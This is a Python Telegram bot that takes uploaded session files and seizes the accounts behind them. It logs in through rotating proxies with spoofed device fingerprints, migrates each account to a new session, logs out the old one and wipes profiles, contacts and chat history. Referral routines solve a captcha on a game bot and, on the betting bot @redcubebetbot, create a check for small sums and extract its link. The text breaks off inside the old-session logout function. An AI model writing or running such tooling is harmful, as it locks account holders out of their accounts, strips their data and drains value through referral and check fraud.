#!/usr/bin/env python3
"""Admin-only Telegram session migrator and account cleaner."""

from __future__ import annotations

import asyncio
import html
import itertools
import json
import logging
import os
import random
import re
import shutil
import tempfile
import time
import uuid
import zipfile
from contextlib import suppress
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from aiogram import BaseMiddleware, Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    BufferedInputFile,
    CallbackQuery,
    Document,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from pydantic import Field, field_validator
from pydantic_settings import BaseSettings, SettingsConfigDict
from session_shop.button_theme import ButtonTheme
from session_shop.files import (
    ArchiveValidationError,
    find_session_files,
    is_sqlite_session,
    remove_upload_artifact,
    safe_extract_session_archive,
    safe_filename,
    secure_path,
)
from session_shop.storage import Database, QueueLimitError
from telethon import TelegramClient
from telethon.errors import (
    AuthKeyUnregisteredError,
    FloodWaitError,
    FreshResetAuthorisationForbiddenError,
    PasswordHashInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PhoneNumberBannedError,
    SessionPasswordNeededError,
    UserDeactivatedError,
)
from telethon.tl.functions.account import (
    ResetWebAuthorizationsRequest,
    SetAccountTTLRequest,
    SetPrivacyRequest,
    UpdateProfileRequest,
    UpdateUsernameRequest,
)
from telethon.tl.functions.auth import LogOutRequest, ResetAuthorizationsRequest
from telethon.tl.functions.channels import (
    DeleteChannelRequest,
    JoinChannelRequest,
    LeaveChannelRequest,
)
from telethon.tl.functions.contacts import (
    BlockRequest,
    DeleteContactsRequest,
    GetContactsRequest,
    ResetSavedRequest,
    UnblockRequest,
)
from telethon.tl.functions.messages import (
    ClearAllDraftsRequest,
    DeleteChatUserRequest,
    DeleteHistoryRequest,
    GetAllStickersRequest,
    GetDialogFiltersRequest,
    StartBotRequest,
    UninstallStickerSetRequest,
    UpdateDialogFilterRequest,
)
from telethon.tl.functions.payments import ClearSavedInfoRequest
from telethon.tl.functions.photos import DeletePhotosRequest, GetUserPhotosRequest
from telethon.tl.types import (
    AccountDaysTTL,
    Channel,
    Chat,
    InputPhoto,
    InputPrivacyKeyChatInvite,
    InputPrivacyKeyForwards,
    InputPrivacyKeyPhoneCall,
    InputPrivacyKeyPhoneNumber,
    InputPrivacyKeyProfilePhoto,
    InputPrivacyKeyStatusTimestamp,
    InputPrivacyValueDisallowAll,
    InputStickerSetID,
    User,
)


with suppress(OSError):
    os.umask(0o077)


# ====================== КОНФИГУРАЦИЯ ======================

class Settings(BaseSettings):
    model_config = SettingsConfigDict(
        env_file=".env",
        env_file_encoding="utf-8",
        env_ignore_empty=True,
        extra="ignore",
    )

    api_id: int = Field(gt=0)
    api_hash: str = Field(min_length=10)
    bot_token: str = Field(min_length=20)

    admin_ids: Set[int]
    session_timeout_minutes: int = Field(default=15, ge=1, le=1440)
    max_queue_per_user: int = Field(default=250, ge=1, le=500)
    max_upload_bytes: int = Field(default=50 * 1024 * 1024, ge=1024)
    max_archive_members: int = Field(default=500, ge=1, le=5000)
    max_archive_uncompressed_bytes: int = Field(default=250 * 1024 * 1024, ge=1024)
    default_auto_code: int = Field(default=1, ge=0, le=2)
    concurrent_workers_per_chat: int = Field(default=2, ge=1, le=6)
    db_file: str = "sessions_v100x.db"
    upload_dir: str = "uploads"
    quarantine_dir: str = "quarantine"
    enable_custom_button_emoji: bool = True
    custom_button_emoji_overrides: str = ""

    ugs_bot_username: str = "GameUGSbot"
    ugs_ref_param: str = ""
    enable_ugs_referral: bool = False

    rc_bot_username: str = "redcubebetbot"
    rc_start_param: str = ""
    rc_channel_1: str = "rcbet"
    rc_channel_2: str = "rc_chat"
    enable_rc_referral: bool = False

    proxy_protocol: Optional[str] = None
    proxy_host: Optional[str] = None
    proxy_port: Optional[int] = None
    proxy_username: Optional[str] = None
    proxy_password: Optional[str] = None

    @field_validator("admin_ids", mode="before")
    @classmethod
    def parse_admin_ids(cls, v):
        if v is None:
            return set()
        if isinstance(v, int):
            return {v}
        if isinstance(v, str):
            return {int(x.strip()) for x in v.split(",") if x.strip()}
        if isinstance(v, (list, set, tuple)):
            return {int(x) for x in v}
        return set()

    @field_validator("admin_ids")
    @classmethod
    def require_admin_ids(cls, value: Set[int]) -> Set[int]:
        if not value:
            raise ValueError("ADMIN_IDS must contain at least one Telegram user ID")
        return value

    @property
    def fallback_proxy(self) -> Optional[dict[str, Any]]:
        if self.proxy_host and self.proxy_port and self.proxy_protocol:
            return {
                "proxy_type": self.proxy_protocol.lower(),
                "addr": self.proxy_host,
                "port": self.proxy_port,
                "username": self.proxy_username,
                "password": self.proxy_password,
            }
        return None


settings = Settings()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("IndustrialWiper")

button_theme = ButtonTheme(
    enabled=settings.enable_custom_button_emoji,
    overrides=settings.custom_button_emoji_overrides,
)
if button_theme.invalid_overrides:
    logger.warning(
        "Некорректные CUSTOM_BUTTON_EMOJI_OVERRIDES проигнорированы: %s",
        ", ".join(button_theme.invalid_overrides),
    )


def has_custom_button_icons(markup: Any) -> bool:
    return isinstance(markup, InlineKeyboardMarkup) and any(
        button.icon_custom_emoji_id
        for row in markup.inline_keyboard
        for button in row
    )


def unicode_fallback_keyboard(markup: InlineKeyboardMarkup) -> InlineKeyboardMarkup:
    rows: list[list[InlineKeyboardButton]] = []
    for row in markup.inline_keyboard:
        fallback_row: list[InlineKeyboardButton] = []
        for button in row:
            icon_key = button_theme.key_for_id(button.icon_custom_emoji_id)
            text = button_theme.label(icon_key, button.text) if icon_key else button.text
            fallback_row.append(
                button.model_copy(
                    update={
                        "text": text,
                        "icon_custom_emoji_id": None,
                        "style": None,
                    }
                )
            )
        rows.append(fallback_row)
    return InlineKeyboardMarkup(inline_keyboard=rows)


class ResilientBot(Bot):
    """Переживает flood control (429) и отклонение премиум-иконок кнопок."""

    @staticmethod
    def _retry_after_seconds(exc: TelegramRetryAfter) -> int:
        """Достать задержку из ответа Telegram и добавить небольшой запас."""
        value = getattr(exc, "retry_after", None)
        if value is None:
            match = re.search(r"Retry in (\d+)", str(exc))
            value = int(match.group(1)) if match else 30
        # Нельзя сокращать retry_after: ранний повтор может продлить блокировку.
        return max(1, int(value) + 2)

    async def _call_once(self, method, request_timeout=None):
        try:
            return await super().__call__(method, request_timeout=request_timeout)
        except TelegramBadRequest as exc:
            markup = getattr(method, "reply_markup", None)
            reason = str(exc).lower()
            if not has_custom_button_icons(markup) or not any(
                marker in reason for marker in ("button", "emoji", "reply markup")
            ):
                raise

            logger.warning(
                "Telegram отклонил custom emoji в кнопках; включён Unicode fallback: %s",
                exc,
            )
            button_theme.enabled = False
            fallback_method = method.model_copy(
                update={"reply_markup": unicode_fallback_keyboard(markup)}
            )
            return await super().__call__(
                fallback_method,
                request_timeout=request_timeout,
            )

    async def __call__(self, method, request_timeout=None):
        attempt = 0
        while True:
            try:
                return await self._call_once(method, request_timeout=request_timeout)
            except TelegramRetryAfter as exc:
                attempt += 1
                wait = self._retry_after_seconds(exc)
                logger.warning(
                    "Telegram flood control на %s: ждём %s c "
                    "(повторная попытка %s, процесс продолжает работать)",
                    type(method).__name__,
                    wait,
                    attempt,
                )
                await asyncio.sleep(wait)


# ====================== ПУЛ ПРОКСИ И ОТПЕЧАТКОВ ======================

FINGERPRINTS = [
    {"device": "MacBook Pro 16", "sys": "macOS 14.5", "app": "5.4.1 x64", "lang": "en"},
    {"device": "Lenovo ThinkPad X1", "sys": "Windows 11 Pro", "app": "5.4.0 x64", "lang": "en"},
    {"device": "ASUS ROG Zephyrus", "sys": "Windows 10 Enterprise", "app": "5.3.8 x64", "lang": "en"},
    {"device": "Dell XPS 15", "sys": "Ubuntu 24.04 LTS", "app": "5.3.9 x64", "lang": "en"},
    {"device": "Surface Laptop Studio", "sys": "Windows 11 Home", "app": "5.4.1 x64", "lang": "en"},
    {"device": "HP Spectre x360", "sys": "Windows 11 Pro", "app": "5.4.0 x64", "lang": "en"},
]


def get_random_fingerprint() -> dict[str, str]:
    return random.choice(FINGERPRINTS)


class ProxyPool:
    def __init__(self, file_path: str = "proxies.txt"):
        self.file_path = Path(file_path)
        self.proxies: List[dict] = []
        self._cycle = None
        self.load_proxies()

    def load_proxies(self):
        if not self.file_path.exists():
            return
        loaded = []
        try:
            for line in self.file_path.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parsed = self._parse_line(line)
                if parsed:
                    loaded.append(parsed)
        except Exception as e:
            logger.warning(f"Ошибка чтения proxies.txt: {e}")

        self.proxies = loaded
        if self.proxies:
            self._cycle = itertools.cycle(self.proxies)

    def _parse_line(self, line: str) -> Optional[dict]:
        try:
            if "://" in line:
                proto, rest = line.split("://", 1)
                auth, host_port = rest.split("@") if "@" in rest else (None, rest)
                host, port = host_port.split(":")
                user, password = auth.split(":") if auth else (None, None)
                return {
                    "proxy_type": proto.lower(),
                    "addr": host,
                    "port": int(port),
                    "username": user,
                    "password": password,
                }
            parts = line.split(":")
            if len(parts) == 4:
                return {
                    "proxy_type": "socks5",
                    "addr": parts[0],
                    "port": int(parts[1]),
                    "username": parts[2],
                    "password": parts[3],
                }
            elif len(parts) == 2:
                return {
                    "proxy_type": "socks5",
                    "addr": parts[0],
                    "port": int(parts[1]),
                    "username": None,
                    "password": None,
                }
        except Exception:
            return None
        return None

    def get_next_proxy(self) -> Optional[dict]:
        if not self._cycle:
            return None
        return next(self._cycle)


proxy_pool = ProxyPool("proxies.txt")


# ====================== КАРАНТИН ПРОБЛЕМНЫХ СЕССИЙ ======================

def save_to_quarantine(chat_id: int, session_path: Path, original_name: str, reason: str):
    q_dir = Path(settings.quarantine_dir) / str(chat_id)
    q_dir.mkdir(parents=True, exist_ok=True)
    secure_path(q_dir, 0o700)
    safe_name = safe_filename(original_name, "failed.session")
    dest = q_dir / safe_name
    if dest.exists():
        dest = q_dir / f"{dest.stem}-{uuid.uuid4().hex[:8]}{dest.suffix}"
    try:
        if session_path and session_path.exists():
            shutil.copy(session_path, dest)
            secure_path(dest)
        log_file = dest.with_suffix(".error.txt")
        log_file.write_text(
            f"Файл: {safe_name}\nПричина: {reason}\nВремя: {datetime.now().isoformat()}\n",
            encoding="utf-8",
        )
        secure_path(log_file)
    except Exception as e:
        logger.error(f"Не удалось сохранить сессию в карантин: {e}")


def count_quarantine(chat_id: int) -> int:
    q_dir = Path(settings.quarantine_dir) / str(chat_id)
    if not q_dir.exists():
        return 0
    return len(list(q_dir.glob("*.session")))


db = Database(settings.db_file)


def is_rc_referral_enabled() -> bool:
    """Runtime флаг рефералки RCBet (переключается командой /rc), переживает рестарт."""
    return db.get_flag("rc_referral", settings.enable_rc_referral)


def set_rc_referral(enabled: bool):
    db.set_flag("rc_referral", enabled)


# ====================== МОДЕЛИ ДАННЫХ ======================

class MigrateStates(StatesGroup):
    waiting_phone = State()
    waiting_password = State()
    waiting_manual_code = State()


@dataclass
class SessionCheckResult:
    is_valid: bool
    status: str
    user_id: Optional[int] = None
    phone: Optional[str] = None
    username: Optional[str] = None
    error: Optional[str] = None


@dataclass
class CleanReport:
    profile_cleared: bool = False
    username_cleared: bool = False
    photos_deleted: int = 0
    contacts_deleted: int = 0
    saved_contacts_reset: bool = False
    folders_deleted: int = 0
    stickers_removed: int = 0
    channels_deleted: int = 0
    dialogs_purged: int = 0
    saved_messages_cleared: bool = False
    privacy_secured: bool = False
    payments_cleared: bool = False
    ttl_set_30d: bool = False
    drafts_cleared: bool = False
    web_auths_reset: bool = False
    sessions_reset: bool = False
    sessions_reset_warning: Optional[str] = None
    ugs_referral_done: bool = False
    rc_referral_done: bool = False
    rc_referral_link: Optional[str] = None


@dataclass
class ActiveMigration:
    id: str
    chat_id: int
    original_name: str = "session.session"
    source_file_path: Optional[Path] = None
    old_client: Optional[TelegramClient] = None
    new_client: Optional[TelegramClient] = None
    phone: str = ""
    phone_code_hash: str = ""
    auto_2fa_password: Optional[str] = None
    proxy_config: Optional[dict] = None
    fingerprint: dict[str, str] = field(default_factory=get_random_fingerprint)
    temp_dir: Optional[Path] = None
    created_at: datetime = field(default_factory=datetime.now)
    last_activity: float = field(default_factory=time.time)
    status_message: Optional[Message] = None
    waiting_2fa: bool = False
    waiting_manual_code: bool = False
    skip_requested: bool = False
    is_new_session: bool = False
    queue_db_id: Optional[str] = None
    old_session_terminated: bool = False
    old_session_error: Optional[str] = None


chat_semaphores: Dict[int, asyncio.Semaphore] = {}
current_migration: Dict[int, ActiveMigration] = {}
queue_workers: Dict[int, bool] = {}
queue_tasks: Dict[int, asyncio.Task] = {}
background_tasks: Set[asyncio.Task] = set()

stats = {"started": 0, "success": 0, "failed": 0, "cancelled": 0, "skipped": 0}


# ====================== УТИЛИТЫ И ПРОВЕРКИ ======================

def start_background_task(coroutine) -> asyncio.Task:
    task = asyncio.create_task(coroutine)
    background_tasks.add(task)

    def task_done(done: asyncio.Task) -> None:
        background_tasks.discard(done)
        if not done.cancelled() and (error := done.exception()) is not None:
            logger.error(
                "Фоновая задача завершилась с ошибкой",
                exc_info=(type(error), error, error.__traceback__),
            )

    task.add_done_callback(task_done)
    return task


def start_queue_worker(chat_id: int, bot: Bot, state: FSMContext) -> asyncio.Task:
    existing = queue_tasks.get(chat_id)
    if existing is not None and not existing.done():
        return existing

    task = start_background_task(queue_worker(chat_id, bot, state))
    queue_tasks[chat_id] = task

    def queue_done(done: asyncio.Task) -> None:
        if queue_tasks.get(chat_id) is done:
            queue_tasks.pop(chat_id, None)

    task.add_done_callback(queue_done)
    return task


def create_upload_directory(chat_id: int) -> Path:
    upload_root = Path(settings.upload_dir)
    upload_root.mkdir(parents=True, exist_ok=True)
    secure_path(upload_root, 0o700)
    directory = Path(
        tempfile.mkdtemp(prefix=f"upload_{chat_id}_", dir=upload_root)
    ).resolve()
    secure_path(directory, 0o700)
    return directory

def get_chat_semaphore(chat_id: int) -> asyncio.Semaphore:
    if chat_id not in chat_semaphores:
        chat_semaphores[chat_id] = asyncio.Semaphore(settings.concurrent_workers_per_chat)
    return chat_semaphores[chat_id]


async def verify_proxy_alive(proxy: dict, timeout: float = 3.0) -> bool:
    host = proxy.get("addr")
    port = proxy.get("port")
    if not host or not port:
        return False
    try:
        conn = asyncio.open_connection(host, port)
        _reader, writer = await asyncio.wait_for(conn, timeout=timeout)
        writer.close()
        await writer.wait_closed()
        return True
    except Exception:
        return False


def resolve_proxy(item_proxy_json: Optional[str]) -> Optional[dict]:
    if item_proxy_json:
        try:
            p = json.loads(item_proxy_json)
            if p:
                return p
        except Exception:
            pass
    pooled = proxy_pool.get_next_proxy()
    if pooled:
        return pooled
    return settings.fallback_proxy


async def resolve_live_proxy(item_proxy_json: Optional[str]) -> Optional[dict]:
    proxy = resolve_proxy(item_proxy_json)
    if proxy is None:
        return None
    if await verify_proxy_alive(proxy):
        return proxy

    fallback = settings.fallback_proxy
    if fallback and fallback != proxy and await verify_proxy_alive(fallback):
        logger.warning("Основной прокси недоступен; используется резервный прокси")
        return fallback
    raise ConnectionError("Настроенный прокси недоступен; прямое подключение отменено")


def render_progress_bar(current: int, total: int, length: int = 10) -> str:
    ratio = min(1.0, max(0.0, current / total)) if total > 0 else 0.0
    filled = int(length * ratio)
    return "█" * filled + "░" * (length - filled) + f" {int(ratio * 100)}%"


class StatusReporter:
    def __init__(self, message: Message, interval: float = 1.5):
        self.message = message
        self.interval = interval
        self.last_update = 0.0
        self.last_text = ""

    async def update(self, text: str, force: bool = False, reply_markup: Optional[InlineKeyboardMarkup] = None):
        now = time.time()
        if not force and (now - self.last_update < self.interval or text == self.last_text):
            return
        try:
            await self.message.edit_text(text, reply_markup=reply_markup)
            self.last_update = now
            self.last_text = text
        except Exception:
            pass


async def delete_sensitive_message(message: Message) -> None:
    with suppress(Exception):
        await message.delete()


def extract_telegram_code(text: str) -> Optional[str]:
    if not text:
        return None
    clean = text.replace("\u200b", "").replace("\u200c", "").replace("\xa0", " ")
    match = re.search(
        r"(?i)(?:code|код|c[oó]digo|passcode|kod|login code)[\D]{0,10}(\d[\d\s\-]{3,6}\d)",
        clean,
    )
    if match:
        digits = re.sub(r"\D", "", match.group(1))
        if 4 <= len(digits) <= 8 and digits != "777000":
            return digits

    for num in re.findall(r"\b\d{5,6}\b", clean):
        if num != "777000":
            return num
    return None


def parse_session_proxy(json_data: dict) -> Optional[dict]:
    p = json_data.get("proxy")
    if isinstance(p, dict):
        proto = p.get("type") or p.get("protocol") or "socks5"
        host = p.get("host") or p.get("addr") or p.get("ip")
        port = p.get("port", 1080)
        if host and port:
            return {
                "proxy_type": proto.lower(),
                "addr": host,
                "port": int(port),
                "username": p.get("user") or p.get("username"),
                "password": p.get("pass") or p.get("password"),
            }
    elif isinstance(p, str) and "://" in p:
        return proxy_pool._parse_line(p)
    return None


async def _safe_unblock_and_retry_send(client: TelegramClient, peer, text: str):
    try:
        return await client.send_message(peer, text)
    except Exception as exc:
        message = str(exc).lower()
        if "blocked" not in message:
            logger.debug("Ошибка при отправке сообщения: %s", exc)
            return None
        try:
            await client(UnblockRequest(id=peer))
            await asyncio.sleep(0.8)
            return await client.send_message(peer, text)
        except Exception as retry_exc:
            logger.warning(
                "Не удалось разблокировать бота или повторить отправку: %s",
                retry_exc,
            )
            return None


async def _safe_click_button(button, client: TelegramClient, peer):
    try:
        return await button.click()
    except Exception as exc:
        message = str(exc).lower()
        if "blocked" not in message:
            logger.debug("Ошибка при нажатии кнопки: %s", exc)
            return None
        try:
            await client(UnblockRequest(id=peer))
            await asyncio.sleep(0.8)
            return await button.click()
        except Exception as retry_exc:
            logger.warning(
                "Не удалось разблокировать бота или повторить нажатие: %s",
                retry_exc,
            )
            return None


def get_configured_client(session_target: Any, fp: dict[str, str], proxy: Optional[dict] = None) -> TelegramClient:
    active_proxy = proxy or settings.fallback_proxy
    return TelegramClient(
        session_target,
        settings.api_id,
        settings.api_hash,
        proxy=active_proxy,
        device_model=fp["device"],
        system_version=fp["sys"],
        app_version=fp["app"],
        lang_code=fp["lang"],
        system_lang_code=fp["lang"],
    )


def is_admin(user_id: int) -> bool:
    return user_id in settings.admin_ids


class AdminOnlyMiddleware(BaseMiddleware):
    """Keep session files and destructive actions restricted to named admins."""

    async def __call__(self, handler, event, data):
        user = data.get("event_from_user")
        message = event if isinstance(event, Message) else getattr(event, "message", None)
        chat = getattr(message, "chat", None)

        if user is None or not is_admin(user.id):
            if isinstance(event, CallbackQuery):
                await event.answer("Доступ запрещён.", show_alert=True)
            elif isinstance(event, Message):
                await event.answer("⛔ Этот бот доступен только владельцу.")
            return None

        if chat is not None and chat.type != "private":
            if isinstance(event, CallbackQuery):
                await event.answer("Используйте бота в личном чате.", show_alert=True)
            elif isinstance(event, Message):
                await event.answer("🔒 Работа с сессиями разрешена только в личном чате.")
            return None

        return await handler(event, data)


def themed_button(
    *,
    text: str,
    icon: str,
    callback_data: str,
    style: str | None = None,
) -> InlineKeyboardButton:
    return InlineKeyboardButton(
        text=button_theme.label(icon, text),
        icon_custom_emoji_id=button_theme.icon_id(icon),
        style=style,
        callback_data=callback_data,
    )


def main_menu_kb(chat_id: int) -> InlineKeyboardMarkup:
    current_mode = db.get_clean_mode(chat_id, settings.default_auto_code)
    if current_mode == 1:
        mode_label = "Авто-миграция"
        mode_icon = "mode"
    elif current_mode == 2:
        mode_label = "Fast Clean"
        mode_icon = "fast"
    else:
        mode_label = "Ручная миграция"
        mode_icon = "mode"

    failed_cnt = count_quarantine(chat_id)
    failed_label = f"Карантин · {failed_cnt}"

    return InlineKeyboardMarkup(inline_keyboard=[
        [
            themed_button(
                text=mode_label,
                icon=mode_icon,
                callback_data="cycle_clean_mode",
                style="primary",
            ),
            themed_button(
                text="Новая сессия",
                icon="new",
                callback_data="btn_new_session",
                style="success",
            ),
        ],
        [
            themed_button(
                text=failed_label,
                icon="failed",
                callback_data="export_failed",
            ),
            themed_button(
                text="Сбросить очередь",
                icon="cancel",
                callback_data="cancel_all",
                style="danger",
            ),
        ],
    ])


def action_kb(can_skip: bool = True) -> InlineKeyboardMarkup:
    buttons = []
    if can_skip:
        buttons.append(
            themed_button(
                text="Пропустить",
                icon="skip",
                callback_data="skip_current",
                style="primary",
            )
        )
    buttons.append(
        themed_button(
            text="Отменить всё",
            icon="cancel",
            callback_data="cancel_all",
            style="danger",
        )
    )
    return InlineKeyboardMarkup(inline_keyboard=[buttons])


def extract_url_from_text(text: str) -> Optional[str]:
    if not text:
        return None
    for url in re.findall(r"https?://\S+|t\.me/\S+", text):
        clean = url.rstrip(".,)]>")
        if "t.me/" in clean or "telegram.me/" in clean or "https://" in clean:
            return clean
    return None


# ====================== АВТО-РЕФЕРАЛКА И КАПЧА @GameUGSbot ======================

async def leave_all_joined_after_referral(client: TelegramClient):
    """Выход из всех групп/каналов/чатов, в которые зашел аккаунт по рефералке."""
    try:
        async for dialog in client.iter_dialogs():
            entity = dialog.entity
            try:
                if isinstance(entity, Channel):
                    if getattr(entity, "left", False):
                        continue
                    try:
                        await client(LeaveChannelRequest(channel=entity))
                    except Exception:
                        pass

                elif isinstance(entity, Chat):
                    try:
                        await client(DeleteChatUserRequest(chat_id=entity.id, user_id="me"))
                    except Exception:
                        pass

                elif isinstance(entity, User):
                    if getattr(entity, "is_self", False):
                        continue
                    if getattr(entity, "bot", False):
                        try:
                            await client(BlockRequest(id=entity))
                        except Exception:
                            pass
                    try:
                        await client(DeleteHistoryRequest(peer=entity, max_id=0, just_clear=False, revoke=True))
                    except Exception:
                        try:
                            await client.delete_dialog(entity)
                        except Exception:
                            pass

            except FloodWaitError as e:
                await asyncio.sleep(min(e.seconds + 1, 30))
            except Exception:
                continue
    except Exception as e:
        logger.warning(f"Ошибка при выходе из чатов после рефералки: {e}")


async def auto_ugs_referral(client: TelegramClient, ref_param: str = "") -> bool:
    """
    Заходит с аккаунта в @GameUGSbot по рефералке,
    подписывается на обязательные каналы из текста и нажимает на загаданный фрукт в капче.
    """
    if not settings.enable_ugs_referral or not ref_param:
        return False

    bot_username = settings.ugs_bot_username
    try:
        bot_entity = await client.get_entity(bot_username)
        await client(
            StartBotRequest(
                bot=bot_entity,
                peer=bot_entity,
                start_param=ref_param,
                random_id=random.randint(1, 2**63 - 1),
            )
        )

        await asyncio.sleep(3.5)

        messages = await client.get_messages(bot_entity, limit=4)
        captcha_msg = None
        for m in messages:
            if m.buttons and m.raw_text:
                captcha_msg = m
                break

        if not captcha_msg:
            logger.warning("Сообщение с капчей от @GameUGSbot не найдено.")
            return False

        text = captcha_msg.raw_text

        channels = re.findall(r"@([a-zA-Z0-9_]{4,32})", text)
        for ch_username in channels:
            if ch_username.lower() == bot_username.lower():
                continue
            try:
                await client(JoinChannelRequest(ch_username))
                logger.info(f"Подписались на @{ch_username}")
                await asyncio.sleep(random.uniform(1.8, 3.2))
            except FloodWaitError as e:
                await asyncio.sleep(min(e.seconds + 1, 30))
            except Exception as e:
                logger.warning(f"Не удалось подписаться на @{ch_username}: {e}")

        for row in captcha_msg.buttons:
            for button in row:
                btn_emoji = (button.text or "").strip()
                if btn_emoji and btn_emoji in text:
                    logger.info(f"Найден фрукт капчи: {btn_emoji}. Нажимаем кнопку...")
                    await asyncio.sleep(random.uniform(1.0, 2.0))
                    await button.click()
                    await asyncio.sleep(1.5)
                    await leave_all_joined_after_referral(client)
                    return True

        logger.warning("Не удалось сопоставить эмодзи фрукта с кнопками.")
        return False

    except Exception as e:
        logger.warning(f"Ошибка при прохождении @GameUGSbot: {e}")
        return False


def _normalize_button_text(text: Optional[str]) -> str:
    if not text:
        return ""
    return re.sub(r"[^a-zа-яё0-9]", "", text.lower())


def _is_checks_button(text: Optional[str]) -> bool:
    """Кнопка «Чеки» с эмодзи/символами: сравниваем по буквам, без эмодзи и знаков."""
    letters = _normalize_button_text(text)
    return letters in {"чек", "чеки", "checks", "cheques", "check"} or letters.endswith("чеки")


def _is_create_check_button(text: Optional[str]) -> bool:
    """Признаки кнопки «Создать чек» в RCBet: разный текст и варианты UI."""
    letters = _normalize_button_text(text)
    return (
        "создатьчек" in letters
        or "createcheck" in letters
        or "newcheck" in letters
        or "generatecheck" in letters
        or "чексоздать" in letters
        or "чек" in letters and "созд" in letters
    )


def _check_url(text: str) -> Optional[str]:
    """
    Ссылка на чек RCBet: t.me/<rc_bot_username>?start=<код>.
    Ссылки на каналы (rcbet, rc_chat, rc_alerts) сюда не попадают.
    """
    if not text:
        return None
    marker = f"t.me/{settings.rc_bot_username.lower()}?start="
    for url in re.findall(r"(?:https?://)?t\.me/\S+", text):
        clean = url.rstrip(".,)]>")
        if marker in clean.lower():
            return clean if clean.startswith("http") else "https://" + clean
    return None


async def auto_rcbet_referral(
    client: TelegramClient, start_param: str = ""
) -> Optional[str]:
    """Сценарий для @redcubebetbot: подписаться на каналы, начать сценарий, открыть Чеки, создать чек, 0.1, 1 и вернуть ссылку."""
    if not is_rc_referral_enabled() or not start_param:
        return None

    bot_username = settings.rc_bot_username
    try:
        bot_entity = await client.get_entity(bot_username)
        await client(
            StartBotRequest(
                bot=bot_entity,
                peer=bot_entity,
                start_param=start_param,
                random_id=random.randint(1, 2**63 - 1),
            )
        )
        await asyncio.sleep(2.0)

        for channel_name in (settings.rc_channel_1, settings.rc_channel_2):
            try:
                await client(JoinChannelRequest(channel_name))
                logger.info(f"Подписались на @{channel_name}")
                await asyncio.sleep(2.0)
            except FloodWaitError as e:
                logger.warning(f"RCbet FloodWait при подписке на @{channel_name}: {e.seconds}s")
                await asyncio.sleep(min(max(20, e.seconds), 30))
            except Exception as e:
                logger.warning(f"Не удалось подписаться на @{channel_name}: {e}")

        await asyncio.sleep(6.0)
        await _safe_unblock_and_retry_send(client, bot_entity, "/start")
        await asyncio.sleep(3.0)

        clicked_checks = False
        last_messages = []
        deadline = time.time() + 45
        while time.time() < deadline and not clicked_checks:
            last_messages = await client.get_messages(bot_entity, limit=16)
            for msg in last_messages:
                for row in (msg.buttons or []):
                    for btn in row:
                        if _is_checks_button(btn.text):
                            try:
                                await _safe_click_button(btn, client, bot_entity)
                                clicked_checks = True
                                logger.info("Нажали кнопку Чеки в redcubebetbot")
                                await asyncio.sleep(2.5)
                                break
                            except FloodWaitError as e:
                                logger.warning(f"RCbet FloodWait после кнопки Чеки: {e.seconds}s")
                                await asyncio.sleep(min(max(20, e.seconds), 30))
                            except Exception as e:
                                logger.warning(f"Ошибка на кнопке Чеки: {e}")
                    if clicked_checks:
                        break
                if clicked_checks:
                    break
            if not clicked_checks:
                await asyncio.sleep(2.0)

        if not clicked_checks:
            logger.warning("Кнопка Чеки не найдена в последних сообщениях redcubebetbot, пробуем fallback-команды.")
            try:
                await _safe_unblock_and_retry_send(client, bot_entity, "Чеки")
                await asyncio.sleep(2.0)
            except Exception:
                pass

        created_clicked = False
        try:
            recent = await client.get_messages(bot_entity, limit=12)
            for msg in recent:
                for row in (msg.buttons or []):
                    for btn in row:
                        if _is_create_check_button(btn.text):
                            try:
                                await _safe_click_button(btn, client, bot_entity)
                                created_clicked = True
                                logger.info("Нажали кнопку 'Создать чек' в redcubebetbot")
                                await asyncio.sleep(2.5)
                                break
                            except Exception as e:
                                logger.debug(f"Не удалось кликнуть 'Создать чек': {e}")
                    if created_clicked:
                        break
                if created_clicked:
                    break
        except Exception as e:
            logger.debug(f"Ошибка при поиске кнопки 'Создать чек': {e}")

        if not created_clicked:
            try:
                await _safe_unblock_and_retry_send(client, bot_entity, "Создать чек")
                await asyncio.sleep(2.5)
            except Exception:
                pass

        await _safe_unblock_and_retry_send(client, bot_entity, "0.1")
        await asyncio.sleep(3.0)
        await _safe_unblock_and_retry_send(client, bot_entity, "1")
        await asyncio.sleep(3.0)

        extracted = None
        deadline = time.time() + 120
        while time.time() < deadline:
            try:
                recent = await client.get_messages(bot_entity, limit=18)
                for msg in recent:
                    text = (msg.raw_text or msg.message or "")
                    if not text:
                        continue
                    found = _check_url(text)
                    if not found:
                        for url in re.findall(r"(?:https?://)?t\.me/\S+|https?://\S+", text):
                            clean = url.rstrip(".,)]>")
                            if f"t.me/{settings.rc_bot_username.lower()}?start=" in clean.lower():
                                found = clean if clean.startswith("http") else "https://" + clean
                                break
                    if found:
                        extracted = found
                        break
                if extracted:
                    break
            except FloodWaitError as e:
                logger.warning(f"RCbet FloodWait в ожидании ответа: {e.seconds}s")
                await asyncio.sleep(min(max(20, e.seconds), 30))
            except Exception as e:
                logger.debug(f"Ошибка чтения ответов redcubebetbot: {e}")
            await asyncio.sleep(2.0)

        if extracted:
            logger.info(f"RCBet ссылка готова: {extracted}")
            return extracted

        logger.warning("RCBet чек не был найден после 0.1 / 1")
        return None

    except FloodWaitError as e:
        logger.warning(f"FloodWait in RCBet: {e.seconds}s")
        await asyncio.sleep(min(max(20, e.seconds), 30))
        return None
    except Exception as e:
        logger.warning(f"Ошибка при прохождении @redcubebetbot: {e}")
        return None


# ====================== ДЕАВТОРИЗАЦИЯ СТАРОЙ СЕССИИ ======================

async def terminate_old_session(old_client: Optional[TelegramClient]) -> Tuple[bool, Optional[str]]:
    if not old_client:
        return True, None

    last_error = None
    for attempt in range(1, 4):
        try:
            if not old_client.is_connected():
                await old_client.connect()

            if not await old_client.is_user_authorized():
                logger.info("Старая сессия уже сброшена сервером Telegram.")
                await old_client.disconnect()
                return True, None

            await old_client(LogOutRequest())
